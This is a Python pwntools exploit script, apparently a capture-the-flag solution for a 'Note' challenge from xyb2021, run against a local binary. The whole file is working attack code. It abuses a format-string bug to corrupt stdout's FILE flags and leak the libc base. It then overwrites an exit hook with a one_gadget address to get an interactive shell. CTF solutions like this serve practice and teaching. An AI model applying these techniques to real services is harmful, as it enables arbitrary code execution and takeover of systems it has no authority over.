#coding:utf-8
from pwn import *
context.log_level = "debug"
p = process("/home/tamako/Desktop/allin/pwns/xyb2021/Note/note")
context.terminal=['tmux','splitw','-h']
pause()

def add(size,content):
	p.recvuntil("choice: ")
	p.sendline("1")
	p.sendlineafter("size: ",str(size))
	p.sendlineafter("content: ",content)
	p.recvuntil("addr: ")

def show():
	p.recvuntil("choice: ")
	p.sendline("3")
	p.recvuntil("content:")
	content = p.recv()
	
#gdb.attach(p,'$rebase 0x1235')
p.recvuntil("choice: ")	
p.sendline("2")
p.recvuntil("say ? ")
p.sendline("%7$s\x00")

payload = p64(0xfbad1800) + p64(0)*3
p.sendline(payload)

#pause()

libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) -0x3c36e0
print "libc_base=>"+hex(libc_base)

exit_hook = libc_base+0x5f0040+3848
one_gadget = 0xf1247 + libc_base

pause()

payload = '%7$s'
payload = payload.ljust(8,'\x00') + p64(exit_hook)
p.recvuntil("choice: ")	
p.sendline("2")
p.recvuntil("say ? ")
pause()
p.sendline(payload)
p.recvuntil("? ")
p.sendline(p64(one_gadget))

p.sendline('5')

p.interactive()
